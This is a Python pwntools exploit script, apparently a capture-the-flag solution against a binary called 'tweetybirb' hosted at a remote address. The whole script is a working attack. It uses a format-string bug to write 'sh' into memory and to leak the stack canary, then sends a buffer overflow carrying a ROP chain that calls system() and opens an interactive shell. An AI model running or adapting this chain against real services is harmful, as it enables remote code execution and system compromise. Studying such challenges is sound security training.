#!/usr/bin/env python3

from pwn import *

HOST = "143.198.184.186"
PORT = 5002

exe = ELF("./tweetybirb")

context.binary = exe
context.log_level = "debug"

def conn():
    #return process([exe.path])
    return remote(HOST, PORT)


def exec_fmt(payload):
    p = process([exe.path])
    p.sendline(payload)
    p.sendline()
    return p.recvall()


def main():
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset

    io = conn()
    io.recvline()
    # We offset +1 because of that the data prefixing this is also a printf magic
    # align 18 for magic
    # pwntools doesn't really expect you to prefix this with another format string
    payload1 = fmtstr_payload(offset+1, {exe.symbols['__bss_start']: b'sh'}, numbwritten=18, write_size='short')
    print(payload1)
    print('Symbol we look for is', exe.symbols['__bss_start'])
    io.sendline(b'%15$lx  '+payload1)
    canary = io.recvline().strip().split()[0]
    canary = int(canary, 16)

    
    rop = ROP(exe)
    rop.raw('a'*0x48)
    rop.raw(p64(canary))
    rop.raw('a'*8)
    # Add another rop to align 16-byte the stack as mandated by SSE2 instructions
    rop.call(rop.ret)
    rop.call('system', [exe.symbols['__bss_start']])
    print('hey what', rop.dump())
    io.sendline(rop.chain())
    io.interactive()

if __name__ == '__main__':
    main()
